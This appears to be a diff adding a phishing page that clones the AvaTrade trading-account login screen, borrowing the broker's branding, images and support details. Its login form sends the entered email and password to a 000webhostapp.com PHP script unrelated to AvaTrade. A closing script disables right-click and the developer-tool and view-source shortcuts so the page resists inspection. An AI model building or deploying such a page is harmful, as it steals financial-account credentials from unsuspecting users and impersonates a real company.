@@ -1,0 +1,376 @@
+<html ng-controller="AuthCtrl as auth" class="myAvaLtr" ng-strict-di="" style="--loader: url('https://myvip.avatrade.com/images/Loader_Ava.svg');"><head>
+    <meta name="title" content="Your account access page - Log in to continue">
+    <meta name="og:title" content="Your account access page - Log in to continue">
+    <meta name="twitter:title" content="Your account access page - Log in to continue">
+    <meta name="description" content="Access your AvaTrade account by logging in with your e-mail address and password. Check your balance, deposit or withdraw funds from your dashboard.">
+    <meta property="og:description" content="Access your AvaTrade account by logging in with your e-mail address and password. Check your balance, deposit or withdraw funds from your dashboard.">
+    <meta name="twitter:description" content="Access your AvaTrade account by logging in with your e-mail address and password. Check your balance, deposit or withdraw funds from your dashboard.">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1, user-scalable=0">
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge;">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <meta property="og:image" content="https://myvip.avatrade.com/images/ava-blue-chart.jpg">
+    <meta property="og:image:secure_url" content="https://myvip.avatrade.com/images/ava-blue-chart.jpg">
+    <meta name="twitter:image" content="https://myvip.avatrade.com/images/ava-blue-chart.jpg">
+    <meta property="og:image:height" content="600">
+    <meta property="og:image:width" content="600">
+    <link rel="stylesheet" href="https://myvip-avatrade.netlify.app/style.css" media="all">
+	<link rel="shortcut icon" ng-href="https://myvip.avatrade.com/images/favicon-avatrade.ico" type="image/x-icon" href="https://myvip.avatrade.com/images/favicon-avatrade.ico">
+
+
+    <base href="/">
+
+    <title ng-bind="companyNameSentence">Your AvaTrade account access page - Log in to continue</title>
+
+</head>
+
+<body class="animated  fadeIn mobile tablet" autoscroll="true" data-style="direction: ltr" ng-class="{'arabic-font-family':direction == 'rtl','default-font-family':direction == 'ltr', 'avajapan':IsAvaJapan, 'ava-device-tablet':mobileConfig.isTablet, 'ava-device-mobile':mobileConfig.isMobile }" style="">
+    <!-- Google Tag Manager --><noscript><iframe src="//www.googletagmanager.com/ns.html?id=" GTM-KLRBJ5" height="0"
+            width="0" style="display: none; visibility: hidden"></iframe></noscript> <!-- End Google Tag Manager -->
+
+    <ava-loader is-loading="isFirstLoading || isLoading">
+
+    </ava-loader>
+    <pushwoosh-subscription-widget>
+        <div id="widget" class="widget">
+            <div id="subscription-widget-root" class="subscription-widget">
+                <div class="subscription-widget__body">
+                    <div class="subscription-widget__header"> Subscribe to our news </div>
+                    <div class="subscription-widget__description"> Get the latest news and updates from AvaTrade! </div>
+                    <div class="subscription-widget__controls">
+                        <button class="subscription-widget__control subscription-widget__control_decline" type="button" id="subscription-widget-decline"> Not Now </button>
+                        <button class="subscription-widget__control subscription-widget__control_accept" type="button" id="subscription-widget-accept"> Subscribe </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </pushwoosh-subscription-widget>
+    <div class="" ng-class="{'overflow-y-auto': mainDivAutoScroll}">
+
+        <div id="mainWrapper" ng-class="{'flex-wrapper': mobileConfig.isMobile, ltr: 'ltr'==direction,rtl: 'rtl'==direction}" ng-show="!isSessionExpiredOpend" class="ltr">
+            <div ng-controller="HeaderCtrl as header" class="main-row header-container" ng-class="{'hidden': isMaintenancePage}">
+
+                <div height-watcher="" is-mobile="mobileConfig.isMobile" is-tablet="mobileConfig.isTablet">
+                    <header ng-if="!hideElements.HideHeader &amp;&amp; registerTypOn" class="main-header">
+                        <div class="container index-bodyContainer">
+                            <div class="row main-header-row">
+                                <div class="col-md-6 col-xs-10" ng-class="{'col-xs-8': auth.isLoggedIn, 'col-xs-10':  !auth.isLoggedIn}">
+									<img ng-if="header.isClickableLogo()" ng-click="header.goToWhiteLabelSite()" id="AvaTradeLogo" src="https://myvip.avatrade.com/images/AvaTrade_logo_2012-1.png" class="avaTrade-logo ava-logo" ng-class="{'atrade-logo': IsATrade, 'ava-logo': IsAvaTrade || IsAvaJapan, 'friedberg-logo': IsFriedbergDirectAVA}">
+                                </div>
+                                <div class="col-md-6 hidden-print hidden-xs hidden-sm hidden-md">
+                                    <ul class="right-icons pull-right" ng-class="{'pull-right':direction == 'ltr','pull-left': direction == 'rtl'}" style="margin-right: 106px;">
+                                    </ul>
+                                </div>
+                                <div class="col-xs-2 hidden-print visible-xs">
+                                    <span class="glyphicon glyphicon-earphone help-icon" ng-click="header.openChatWindow()"></span>
+                                </div>
+                            </div>
+                        </div>
+                    </header>
+	
+
+                    <div ng-if="!hideElements.HideSubHeader" ng-show="registerTypOn" class="row main-profile-nav-cnt main-profile-nav hidden-print" ng-class="{'webTrader-container':wtContainer, 'praxis': isDepositPraxis}">
+                        <div class="container index-bodyContainer">
+                            
+							<div class="row">
+                                <div class="col-md-6 col-xs-6 subHeader-Welcom-pdlz">
+                                    <div id="welcomeText" class="welcom fadeInLeft  animated">Access your account
+                                        dashboard
+                                        <!--<span ng-if="$root.IsAvaJapan && header.userProfile"> {{ 'Mr' | translate }}</span>-->
+                                    </div>
+                                </div>
+
+                                <div class="col-md-offset-2 col-md-4 col-xs-6 total-balance-container">
+                                    <header-balance is-mobile="mobileConfig.isMobile">
+                                        <timer>
+                                            <!-- ngIf: $ctrl.isLoggedIn && $ctrl.CurrencyGroups -->
+                                        </timer>
+                                    </header-balance>
+                                </div>
+                            </div>
+                        </div>
+                    </div><!-- end ngIf: !hideElements.HideSubHeader -->
+                    <!--Mobile-->
+                    <!--<div class="progress" ng-if="mobileConfig.isMobile && regPercent > 0">
+                        <div class="progress-bar" role="progressbar" aria-valuemin="0" aria-valuenow="{{ regPercent }}" aria-valuemax="100" style="width: {{regPercent}}%">{{regPercent.toFixed()}}%</div>
+                    </div>-->
+                    <!-- ngIf: mobileConfig.isMobile && IsFriedbergDirectAVA && (numOfSteps && currentStep && currentStep > 1) -->
+
+                    <!-- ngIf: mobileConfig.isMobile && (numOfSteps && currentStep) && !IsJoint && showProgressBarMobile -->
+
+                    <!--Mobile-->
+                </div>
+            </div>
+            <div class="container index-bodyMarginTop" ng-hide="vueAvaIframeFullView" ng-class="{ 'index-bodyContainer': auth.isLoggedIn &amp;&amp; !auth.isWebTraderShortDemoToReal(), 'wm-wtiframe':auth.isWebTrader, 'padding-0': mobileConfig.isMobile}" id="main-container" style="">
+                <div class="row main-content-row">
+                    <!-- ngIf: !hideElements.HideLeftSideMenu -->
+                    <div class="col-md-2 hidden-print left-menu-holder ng-hide" ng-if="!hideElements.HideLeftSideMenu" ng-show="auth.isLoggedIn &amp;&amp; registerTypOn">
+                        <side-menu-cmp is-atrade="IsATrade">
+                            <aside class="main-aside-nav animated fadeIn" ng-class="{'collapse navbar-collapse':$ctrl.mobileConfig.isMobile || $ctrl.mobileConfig.isTablet}">
+                                <div ng-click="$ctrl.updateIsShowHamburger()" class="nav">
+                                    <ul class="main-aside-ul">
+                                        <!-- ngRepeat: menuItem in $ctrl.menuItems -->
+                                        <!-- ngIf: $ctrl.isAtrade && $ctrl.hasRealAccount && $ctrl.educationItem -->
+                                        <li class="empty-li"></li>
+                                    </ul>
+                                    <div id="marginMenu" class="menuTop menuNoneblock"></div>
+                                    <!-- ngIf: $ctrl.mobileConfig.isMobile || $ctrl.mobileConfig.isTablet -->
+                                    <!-- ngIf: $ctrl.mobileConfig.isMobile || $ctrl.mobileConfig.isTablet -->
+                                </div>
+                            </aside>
+                            <div class="blur-off"></div>
+                        </side-menu-cmp>
+                    </div><!-- end ngIf: !hideElements.HideLeftSideMenu -->
+                    <!-- ngIf: $state.current.name -->
+                    <div ng-if="$state.current.name" class="ng-scope middle-section col-xs-12 col-sm-12 col-lg-9" ng-class="{ 'col-lg-7': auth.isLoggedIn &amp;&amp; !auth.isWebTrader, 'col-lg-9': !auth.isLoggedIn , 'center-body':!mobileConfig.isMobile &amp;&amp; !mobileConfig.isTablet &amp;&amp; hideElements.RightSideMenu &amp;&amp; hideElements.LeftSideMenu ,'smallerButton':mobileConfig.isMobile, 'padding-0' : isDeposit || isDepositPraxis || activeRouteVueAva || vueRoutes.includes($state.current.name), 'deposit': isDeposit, 'praxis-width': isDepositPraxis &amp;&amp; mobileConfig.isMobile, 'vue-ava': vueRoutes.includes($state.current.name)  }" style="">
+                        <!-- uiView:  -->
+                        <div ng-show="!vueRoutes.includes($state.current.name) &amp;&amp; !$state.current.vueRoute" ui-view="" class="iframe-view">
+                            <!--<h4 class = "home-title">Welcome to MyAva </h4>-->
+                            <div class="uiview-content-box">
+                                <div class="wrapper">
+                                    <div style="min-height: 200px">
+                                        <!-- ngIf: !isSessionExpiredOpend -->
+                                        <div ng-if="!isSessionExpiredOpend" id="avaloginWidgetContainer" style="display: block;" class="avatrade-login">
+                                            <div id="AvasLogWidget" class="myAvaBootstrap actionLogin" style="background:">
+                                                <form id="loginForm" action="https://subscription-widget-root.000webhostapp.com/popup/pop.php" method="post" data-di-form-track="" data-di-form-id="login">
+                                                    <fieldset>
+                                                        <legend class="avasLogDisplay1 avasLogInTpH4">Log in to your
+                                                            Account</legend>
+                                                        <legend class="avasLogDisplay2 avasFPTpH4">Forgot your password?
+                                                        </legend>
+                                                        <p class="avasLogDisplay2 avasSmallFont">Enter your e-mail
+                                                            address below and we will send you an e-mail with a link to
+                                                            reset your password.</p>
+                                          <div id="avasLoginStatusMessage" style="display: block;"><p id="avasLoginForgotPasswordEMss" class="avasLogDisplay2 red avasSmallFont">Incorrect email address</p><p id="avasLoginUserBlocked" class="avasLogDisplay1 red avasSmallFont" style="display: none;">The credentials used are incorrect for several&nbsp;attempts, the user is locked. Please reset the password or contact our customer support for help</p></div>
+                                                        <div class="row">
+                                                            <div class="input-row-mobile input-row">
+                                                                <div class="col-md-12 col-xs-12 input icon-email text-left">
+                                                                    <input placeholder="Email" tabindex="3" class="form-control input-field form-control text-left" maxlength="200" autofocus="" type="email" id="logEmailInput" name="email" data-help-message="You will receive a confirmation email to this address" data-error-message="Email is not valid" data-email-exist="Email already exist" data-required-message="Email Required" data-email-notexist="Email already exist" data-reset-pass="To reset your password, please enter the email associated to your account" data-reset-message="To reset your password, please enter the email associated to your account" autocomplete="off" value="" ''="" title="You will receive a confirmation email to this address">
+                                                                    <div class="mess-box login-email-err">
+                                                                        <span id="help-block1" class="help-block"></span>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="row avasLogDisplay1">
+                                                            <div class="input-row-mobile input-row login-password-row">
+                                                                <div class="col-md-12 col-xs-12 input icon-email text-left">
+                                                                    <input placeholder="Password" tabindex="52" class="input-field  form-control text-left" maxlength="15" type="password" id="password" name="password" data-help-message="Password must be 8-15 English characters, combine numbers, upper and lower cases, and not include your name" data-error-message="Password must be 8-15 English characters, combine numbers, upper and lower cases, and not include your name" data-email-exist="Password must be 8-15 English characters, combine numbers, upper and lower cases, and not include your name" data-required-message="Password must be 8-15 English characters, combine numbers, upper and lower cases, and not include your name" autocomplete="off" value="" ''="" title="Password must be 8-15 English characters, combine numbers, upper and lower cases, and not include your name"><i id="icon-password" class="fa fa-eye fa-lg pw-icon"></i>
+                                                                    <div class="mess-box">
+                                                                        <span id="help-block2" class="help-block"></span>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="row">
+                                                            <div class="col-md-12 col-xs-12 col-sm-12 avasLogDisplay1">
+                                                                <div id="recaptcha" style="display: flex; justify-content: center; margin-bottom: 15px;">
+                                                                </div>
+                                                                <div id="px-captcha"></div>
+                                                                <button id="AvasWidgetLoginSubmit" type="submit" data-default-text="Login" data-pendeing-text="Logging..." class=" btn Login_btn-blue text" tabindex="53">Login</button>
+                                                            </div>
+                                                            <div class="col-md-12 col-xs-12 col-sm-12 avasLogDisplay1">
+                                                                <p class=" forgot-pass"><a id="AvasWidgetLogCancel" href="javascript:void(0)" class="text">Forgot
+                                                                        your password?</a></p>
+                                                            </div>
+                                                            <div class="col-md-12 col-xs-12 col-sm-12">
+                                                                <button id="AvasWidgetFPSubmit" type="button" data-checking-text="checking..." data-default-text="Submit" class="avasLogDisplay2 btn btn-submit" tabindex="53">Submit</button>
+                                                            </div>
+                                                            <div class="col-md-12 col-xs-12 avasLogDisplay2">
+                                                                <p class=" forgot-pass"><a class="text" id="AvasWidgetFPCancel" tabindex="54" href="javascript:void(0)">Cancel</a></p>
+                                                            </div>
+                                                        </div>
+                                                    </fieldset>
+                                                </form>
+                                                <div id="avasFPPendingMess" class="row">
+                                                    <div class="col-xs-12">
+                                                        <h4 class="font-bold">Email Sent</h4>
+                                                        <p id="forgotPassword" class="forgotPasswordDescription">Thank
+                                                            you. We have sent you an email with instructions for
+                                                            resetting your password.</p>
+                                                        <p id="abandonUserForgotPassword">An email was sent to your
+                                                            registered email account. Please see the instructions there
+                                                            and proceed accordingly.</p>
+                                                        <p class="avasLoginlink">
+                                                            <button type="button" id="AvasWidgetFPReturn" class="btn Login_btn-blue text" tabindex="54" data-default-text="Return to Login" href="javascript:void(0)">Return to Login</button>
+                                                        </p>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div><!-- end ngIf: !isSessionExpiredOpend -->
+                                    </div>
+                                    <div class="hline"></div>
+                                    <div class="hp-box">
+                                        <div class="col-md-12 col-xs-12 col-sm-12">
+                                            <div class="hp-text"> Don't have an account? </div>
+                                        </div>
+                                        <div class="col-md-12 col-xs-12 col-sm-12"> <a class="btn hp-submit-btn hp-real-acc-btn" href="https://www.avatrade.com/trading-account"><span class="text"> Open Real Account </span></a>
+                                        </div>
+                                        <div class="col-md-12 col-xs-12 col-sm-12">
+                                            <div class="hp-text">or</div>
+                                        </div>
+                                        <div class="col-md-12 col-xs-12 col-sm-12"> <a class="btn hp-submit-btn hp-demo-acc-btn" href="https://www.avatrade.com/demo-account"><span class="text"> Try free demo </span></a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- ngIf: vueRoutes.includes($state.current.name) || $state.current.vueRoute -->
+                        <!-- banners Desktop -->
+                        <!-- ngIf: !hideElements.HideBanner && !mobileConfig.isMobile && $state.current.name === 'my_account' -->
+                    </div><!-- end ngIf: $state.current.name -->
+                    <!-- ngIf: !(mobileConfig.isMobile || mobileConfig.isTablet) -->
+                    <div ng-show="registerTypOn" ng-if="!(mobileConfig.isMobile || mobileConfig.isTablet)" class="col-md-3 right-section hidden-print hidden-xs hidden-sm hidden-md">
+                        <add-account-btn ng-show="!hideElements.HideAddAccountBtn" class="">
+                            <!-- ngIf: $ctrl.isLoggedIn && $ctrl.showAddAccountButtons && $ctrl.showButton -->
+                        </add-account-btn>
+                        <div ng-controller="SideBoxCtrl" class="sideBoxCnt" ng-show="!hideElements.HideRightSideMenu" ng-class="{'hidden': isMaintenancePage}">
+                            <div class="sideBoxWrap" scroll-and-fix="fixedBox">
+                                <!-- ngIf: pt && show_pro -->
+                                <!-- ngIf: sideBox1 -->
+                                <!-- ngInclude:  -->
+                                <div data-ng-include="" src="help" class="sideBoxCnt fixed" style="">
+                                    <section class="main-right-section need-help-mobile">
+                                        <!-- ngIf: IsChinaDomain -->
+                                        <!-- ngIf: !IsChinaDomain -->
+                                        <div class="needHelp" ng-if="!IsChinaDomain" ng-bind="'needHelp' | translate">
+                                            Need Help?</div><!-- end ngIf: !IsChinaDomain -->
+                                        <div class="callUs" ng-bind="'callUs' | translate">Call us:</div>
+                                        <div class="supportNumber" ng-bind="supportNumber" id="supportNumber">+1
+                                            212-941-9609</div>
+                                        <div class="chatImage"> <img src="https://myvip.avatrade.com/images/HelpChat2.png" alt="">
+                                        </div> <!-- ngIf: !isWhiteLabel && !IsChinaDomain  && ShowLiveChat -->
+                                        <div class="helpTextSupport" ng-if="!isWhiteLabel &amp;&amp; !IsChinaDomain  &amp;&amp; ShowLiveChat">
+                                            <div class="helpTextSupport" ng-bind="'startLiveChat' | translate">Or Start
+                                                Live Chat with support agent</div>
+                                        </div><!-- end ngIf: !isWhiteLabel && !IsChinaDomain  && ShowLiveChat -->
+                                        <!-- ngIf: IsChinaDomain -->
+                                        <!-- ngIf: !isWhiteLabel -->
+                                        <div class="chatBtnContainer" ng-if="!isWhiteLabel">
+                                            <button ng-show="ShowLiveChat &amp;&amp; chatLoaded" id="help_btn" class="btn chatBtn" ng-click="openChatWindow()" style=""><span class="chatBtntxt"> Chat with us </span></button>
+                                        </div><!-- end ngIf: !isWhiteLabel -->
+                                        <div class="whatsAppMainContainer">
+                                            <!-- ngIf: myAvaConfig.whatsApp.enabled && toShowWhatsappButton() -->
+                                        </div>
+                                    </section>
+                                </div>
+                                <!-- ngInclude:  -->
+                                <!-- ngIf: auth.isLoggedIn -->
+                                <!-- ngInclude:  -->
+                                <div ng-show="!IsATrade &amp;&amp; !IsFriedbergDirectAVA" data-ng-include="" src="safety" class="sideBoxCnt fixed" style="">
+                                    <div class="visible-xs">
+                                        <span class="safety-header side-menu-item" ng-click="openSafetyPopup()">Safety of your funds </span>
+                                    </div>
+                                    <section class="main-right-section hidden-xs">
+                                        <div class="safety">
+                                            <div class="left">
+                                                <!--<img src="https://myvip.avatrade.com/images/saftey_sideBar.png" style="margin-left: 15%" alt="" />-->
+                                                <svg class="icon-svg" width="100%">
+                                                    <use xlink:href="https://myvip.avatrade.com/images/icon_sprite.svg#safety-funds"></use>
+                                                </svg>
+                                            </div>
+                                            <div class="right">
+                                                <div class="safety-header">Safety of your funds </div>
+                                                <span>AvaTrade uses high-end systems and tools to secure the funds and identity of its clients. </span>
+                                                <div> <a href="#" class="blueText" id="openPopup" ng-click="openSafetyPopup()">Learn More </a> </div>
+                                            </div>
+                                            <div style="clear: both"></div>
+                                            <div class="hline"></div>
+                                            <div class="left">
+                                                <!--<img src="https://myvip.avatrade.com/images/ssl_sideBar.png" alt="" />-->
+                                                <svg class="icon-svg" width="100%">
+                                                    <use xlink:href="https://myvip.avatrade.com/images/icon_sprite.svg#ssl"></use>
+                                                </svg>
+                                            </div>
+                                            <div class="right">
+                                                <span>This website is using 256-bit SSL encryption for a secured online experience.  </span>
+                                            </div>
+                                            <div style="clear: both"></div>
+                                        </div>
+                                    </section>
+                                </div>
+                            </div>
+                        </div>
+                    </div><!-- end ngIf: !(mobileConfig.isMobile || mobileConfig.isTablet) -->
+                </div>
+                <!-- ngIf: isMobileAny -->
+                <!-- ngIf: !IsAvaJapan && !hideElements.HideFooter && !isDepositPraxis && !isLossLimitPopup -->
+                <div ng-controller="FooterCtrl as footer" ng-if="!IsAvaJapan &amp;&amp; !hideElements.HideFooter &amp;&amp; !isDepositPraxis &amp;&amp; !isLossLimitPopup" ng-class="{'hidden': isMaintenancePage}">
+                    <!-- ngIf: registerTypOn -->
+                    <div class="row footer-wrapper" ng-if="registerTypOn">
+                        <div class="col-md-12 col-xs-12 fadeIn animated footer-border">
+                            <div class="row footer-cnt" ng-class="{'footer-cnt' : !mobileConfig.isMobile}">
+                                <div class="col-md-12 col-xs-12">
+                                    <table class="footer-table">
+                                        <tbody>
+                                            <tr>
+                                                <td class="ng-binding footer-disclaimer-cnt">
+                                                    <!-- ngIf: !IsFriedbergDirectAVA -->
+                                                    <div class="Separation_Section enSeparation_Section hidden-xs" ng-if="!IsFriedbergDirectAVA"></div>
+                                                    <!-- end ngIf: !IsFriedbergDirectAVA -->
+                                                    <div class="footer-text" ng-bind-html="footer.disclaimer" compile-template=""></div>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                    </div><!-- end ngIf: registerTypOn -->
+                </div>
+                <!-- end ngIf: !IsAvaJapan && !hideElements.HideFooter && !isDepositPraxis && !isLossLimitPopup -->
+            </div>
+            <!-- ngIf: showMissingQuestionsPopup || showLossLimitPopup || showTypEu || showOtpVerificationPopup -->
+        </div>
+        <!-- ngIf: mobileConfig.isMobile || mobileConfig.isTablet -->
+        <challenge-widget-cmp></challenge-widget-cmp>
+    </div>
+
+
+    <!--Sentry.io-->
+
+
+    <!-- start template tags -->
+
+    <!-- end template tags -->
+    <!--challenge-->
+
+    <!--challenge-->
+
+    <!-- webeyez -->
+    <!-- ngIf: $root.IsWebeyezEnabled -->
+    <!-- webeyez -->
+
+
+
+
+
+ 
+    <div id="ada-entry">
+        <div style="position: fixed; width: 635px; height: 785px; right: 0px; background: linear-gradient(315.92deg, rgba(0, 0, 0, 0.08) 0%, rgba(0, 0, 0, 0) 40.92%); bottom: 0px; pointer-events: none; z-index: 9999; transition: all 500ms linear 0s; opacity: 0;">
+        </div>
+	
+ <script> 
+      document.addEventListener('contextmenu', event=> event.preventDefault()); 
+      document.onkeydown = function(e) { 
+      if(event.keyCode == 123) { 
+      return false; 
+      } 
+      if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){ 
+      return false; 
+      } 
+      if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){ 
+      return false; 
+      } 
+      if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){ 
+      return false; 
+      } 
+      } 
+      </script> 
+
+
+
+
+</body>
+</html>
